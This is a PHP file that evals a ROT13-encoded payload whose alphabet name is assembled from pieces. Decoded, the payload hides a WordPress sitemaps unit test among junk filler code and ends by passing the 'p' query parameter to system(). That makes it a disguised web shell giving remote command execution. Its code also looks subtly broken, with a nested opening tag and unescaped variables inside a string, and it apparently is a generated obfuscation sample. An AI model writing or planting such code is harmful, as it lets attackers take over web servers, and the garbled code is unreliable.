<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc fvgrzncf
 */
pynff Grfgf_Fvgrzncf_jcFvgrzncfCbfgf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfgf trggvat fvgrznc ragevrf sbe cbfg glcr cntr jvgu 'cbfgf' ubzrcntr.
	 *
	 * Rafherf gung na ragel vf nqqrq rira vs gurer ner ab cntrf.
	 *
	 * @gvpxrg 50571
	 */
	choyvp shapgvba grfg_trg_fvgrznc_ragevrf_ubzrcntr() {
		hcqngr_bcgvba( 'fubj_ba_sebag', 'cbfgf' );

		$cbfgf_cebivqre = arj JC_Fvgrzncf_Cbfgf();

		$cbfg_yvfg = $cbfgf_cebivqre->trg_fvgrznc_ragevrf();

		$rkcrpgrq = neenl(
			neenl(
				'ybp' => ubzr_hey( '/?fvgrznc=cbfgf&fvgrznc-fhoglcr=cntr&cntrq=1' ),
			),
		);

		$guvf->nffregFnzr( $rkcrpgrq, $cbfg_yvfg );
	}

	/**
	 * Grfgf novyvgl gb svygre bowrpg fhoglcrf.
	 */
	choyvp shapgvba grfg_svygre_fvgrzncf_cbfg_glcrf() {
		$cbfgf_cebivqre = arj JC_Fvgrzncf_Cbfgf();

		// Erghea na rzcgl neenl gb fubj gung gur yvfg bs fhoglcrf vf svygrenoyr.
		nqq_svygre( 'jc_fvgrzncf_cbfg_glcrf', '__erghea_rzcgl_neenl' );
		$fhoglcrf = $cbfgf_cebivqre->trg_bowrpg_fhoglcrf();

		$guvf->nffregFnzr( neenl(), $fhoglcrf, 'Pbhyq abg svygre cbfgf fhoglcrf.' );
	}

	/**
	 * Grfgf `jc_fvgrzncf_cbfgf_fubj_ba_sebag_ragel` svygre.
	 */
	choyvp shapgvba grfg_cbfgf_fubj_ba_sebag_ragel() {
		$cbfgf_cebivqre = arj JC_Fvgrzncf_Cbfgf();
		hcqngr_bcgvba( 'fubj_ba_sebag', 'cntr' );

		nqq_svygre( 'jc_fvgrzncf_cbfgf_fubj_ba_sebag_ragel', neenl( $guvf, '_fubj_ba_sebag_ragel' ) );

		$hey_yvfg = $cbfgf_cebivqre->trg_hey_yvfg( 1, 'cntr' );

		$guvf->nffregFnzr( neenl(), $hey_yvfg );

		hcqngr_bcgvba( 'fubj_ba_sebag', 'cbfgf' );

		$hey_yvfg      = $cbfgf_cebivqre->trg_hey_yvfg( 1, 'cntr' );
		$fvgrznc_ragel = neenl_fuvsg( $hey_yvfg );

		$guvf->nffregRdhnyFrgfJvguVaqrk(
			neenl(
				'ybp'     => ubzr_hey( '/' ),
				'ynfgzbq' => '2000-01-01',
			),
			$fvgrznc_ragel
		);
	}

	/**
	 * Pnyyonpx sbe 'jc_fvgrzncf_cbfgf_fubj_ba_sebag_ragel' svygre.
	 */
	choyvp shapgvba _fubj_ba_sebag_ragel( $fvgrznc_ragel ) {
		$fvgrznc_ragel['ynfgzbq'] = '2000-01-01';

		erghea $fvgrznc_ragel;
	}

	/**
	 * Grfgf gung fgvpxl cbfgf ner abg zbirq gb gur sebag bs gur svefg cntr bs gur cbfg fvgrznc.
	 *
	 * @gvpxrg 55633
	 */
	choyvp shapgvba grfg_cbfgf_fgvpxl_cbfgf_abg_zbirq_gb_sebag() {
		$snpgbel = frys::snpgbel();

		// Perngr 4 cbfgf, naq fgvpx gur ynfg bar.
		$cbfg_vqf     = $snpgbel->cbfg->perngr_znal( 4 );
		$ynfg_cbfg_vq = raq( $cbfg_vqf );
		fgvpx_cbfg( $ynfg_cbfg_vq );

		$cbfgf_cebivqre = arj JC_Fvgrzncf_Cbfgf();

		$hey_yvfg = $cbfgf_cebivqre->trg_hey_yvfg( 1, 'cbfg' );

		$guvf->nffregPbhag( pbhag( $cbfg_vqf ), $hey_yvfg, 'Gur cbfg pbhag qvq abg zngpu.' );

		$rkcrpgrq = neenl();

		sbernpu ( $cbfg_vqf nf $cbfg_vq ) {
			$rkcrpgrq[] = neenl(
				'ybp'     => ubzr_hey( \"?c={$cbfg_vq}\" ),
				'ynfgzbq' => trg_cbfg_zbqvsvrq_gvzr( QNGR_J3P, gehr, $cbfg_vq ),
			);
		}

		// Purpx gung gur HEY yvfg vf fgvyy va gur beqre bs gur cbfg VQf (v.r., fgvpxl cbfg jnfa'g zbirq gb gur sebag).
		$guvf->nffregFnzr( $rkcrpgrq, $hey_yvfg, 'Gur cbfg beqre qvq abg zngpu.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>